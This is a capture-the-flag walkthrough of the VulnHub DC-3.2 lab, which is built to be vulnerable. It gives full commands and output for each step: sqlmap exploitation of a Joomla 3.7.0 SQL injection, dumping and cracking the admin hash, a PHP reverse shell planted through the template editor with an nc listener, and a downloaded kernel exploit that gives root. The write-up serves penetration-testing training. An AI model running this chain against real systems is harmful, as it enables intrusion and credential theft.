# VulnHub > DC 3.2

**About Release**

* Name: DC: 3.2
* Date release: 25 Apr 2020
* Author: DCAU
* Series: DC
* Web page: http://www.five86.com/dc-3.html

**Description**

DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).

If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.

**Download**

* DC-3-2.zip (Size: 1005 MB)
* Download: http://www.five86.com/downloads/DC-3-2.zip
* Download (Mirror): https://download.vulnhub.com/dc/DC-3-2.ziphttps://download.vulnhub.com/dc/DC-3-2.zip
* Download (Torrent): https://download.vulnhub.com/dc/DC-3-2.zip.torrent ([Magnet](magnet:?xt=urn:btih:E0759EC0DB6498F077BFE964D3E25AEA22FA6415&dn=DC-3-2.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

# Services Enumeration

There is only 1 open port according to Nmap: HTTP on standard port 80/tcp:

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
~~~

# Web Enumeration (Joomla)

Browsing `http://dc-3/` reveals that the Joomla CMS is installed. Let's use `joomscan` to confirm and get the version.

~~~
kali@kali:/data/src/joomscan$ perl joomscan.pl -u http://dc-3/

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dc-3/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://dc-3/administrator/components
http://dc-3/administrator/modules
http://dc-3/administrator/templates
http://dc-3/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dc-3/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dc-3/
~~~

# Identify vulnerabilities

The version is quite old and suffers from critical vulnerabilities. Let's download the exploit #42033:

~~~
kali@kali:/data/DC-3-2/files$ searchsploit joomla 3.7.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                         | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                      | php/webapps/43488.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:/data/DC-3-2/files$ searchsploit -m 42033
~~~

# Exploit (SQL injection)

## List the databases

The exploit file provides us with a URL vulnerable to SQL injection. Let's use `sqlmap`:

~~~
kali@kali:/data/DC-3-2/files$ sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

[REDACTED]

sqlmap identified the following injection point(s) with a total of 2712 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(UPDATEXML(8947,CONCAT(0x2e,0x71626b7671,(SELECT (ELT(8947=8947,1))),0x71766a7071),6088))

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6160 FROM (SELECT(SLEEP(5)))uGYJ)
---
[15:34:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1
[15:34:25] [INFO] fetching database names
[15:34:25] [INFO] retrieved: 'information_schema'
[15:34:25] [INFO] retrieved: 'joomladb'
[15:34:25] [INFO] retrieved: 'mysql'
[15:34:25] [INFO] retrieved: 'performance_schema'
[15:34:25] [INFO] retrieved: 'sys'
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys

[15:34:25] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2671 times
[15:34:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/dc-3'

[*] ending @ 15:34:25 /2020-10-06/
~~~

## Dump the users table

Now that we now the database name (`joomladb`), we can list the tables. There is a `users` table that should contain credentials; let's dump the content:

~~~
kali@kali:/data/DC-3-2/files$ sqlmap -u "http://dc-3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --dump

[REDACTED]

Database: joomladb
Table: #__users
[1 entry]
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+
| id  | name  | email                    | params                                                                                       | password                                                     | username |
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+
| 629 | admin | freddy@norealaddress.net | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+-----+-------+--------------------------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+----------+
~~~

# Joomla admin access

## Crack the admin password

Now provided with admin hashed password, let's save it to a file and run John:

~~~
kali@kali:/data/DC-3-2/files$ /data/src/john/run/john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snoopy           (admin)
1g 0:00:00:02 DONE (2020-10-06 15:43) 0.3875g/s 55.81p/s 55.81c/s 55.81C/s 555555..sandra
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Now that we have the admin's password, let's connect to `http://dc-3/administrator/` with `admin:snoopy`.

# Reverse shell

From the admin panel go to "Extensions > Templates > Beez3 > Editor". Edit the `error.php` page and replace the content with a PHP reverse shell. Click on the "Save" button.

Now, start a listener (`rlwrap nc -nlvp 4444`) and browse the `error.php` page.

~~~
$ curl dc-3/templates/beez3/error.php
~~~

You now have a reverse shell spawned to the listener window:

~~~
kali@kali:/data/DC-3-2/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.158] 59558
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 23:49:59 up 34 min,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@DC-3:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Privilege escalation

## Vulnerable OS / kernel

The target is running an old release of Ubuntu 16.04 with an old kernel:

~~~
www-data@DC-3:/tmp$ cat /etc/issue
cat /etc/issue
Ubuntu 16.04 LTS \n \l
www-data@DC-3:/tmp$ uname -a
uname -a
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
~~~

Searching for privilege escalation exploits affecting Ubuntu 16.04 will provide you with several exploits:

~~~
kali@kali:/data/DC-3-2/files$ searchsploit ubuntu 16.04 privilege escalation
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                  | linux/local/40054.c
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                      | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwca | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local | linux_x86/local/42276.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation               | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation        | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation    | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                   | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                         | linux/local/40489.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                  | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                         | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation              | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)          | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KA | linux/local/47169.c
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

## Download the exploit ('double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation)

After trying several of them without success, I eventually found one that worked: "Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation". The exploit file contains a github link to download the exploit files:

~~~
kali@kali:/data/DC-3-2/files$ searchsploit -m 39772
kali@kali:/data/DC-3-2/files$ grep github 39772.txt 
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
~~~

Let's download the exploit files:

~~~
kali@kali:/data/DC-3-2/files$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
~~~

## Exploit the target

Transfer the exploit on the target, compile and run it:

~~~
www-data@DC-3:/tmp$ tar xf exploit.tar
www-data@DC-3:/tmp$ cd ebpf_mapfd_doubleput_exploit
www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh
www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@DC-3:/tmp/ebpf_mapfd_doubleput_exploit# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
~~~

# Root flag

Now with a root shell, let's get the flag:

~~~
root@DC-3:/tmp/ebpf_mapfd_doubleput_exploit# cd /root
cd /root
root@DC-3:/root# ls -la
ls -la
total 28
drwx------  2 root root 4096 Apr 25 16:27 .
drwxr-xr-x 22 root root 4096 Mar 23  2019 ..
-rw-------  1 root root 1202 Apr 25 16:27 .bash_history
-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc
-rw-------  1 root root   71 Mar 23  2019 .mysql_history
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-------  1 root root    0 Apr 25 16:27 .viminfo
-rw-r--r--  1 root root  604 Mar 26  2019 the-flag.txt
root@DC-3:/root# cat the-flag.txt
cat the-flag.txt
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
~~~
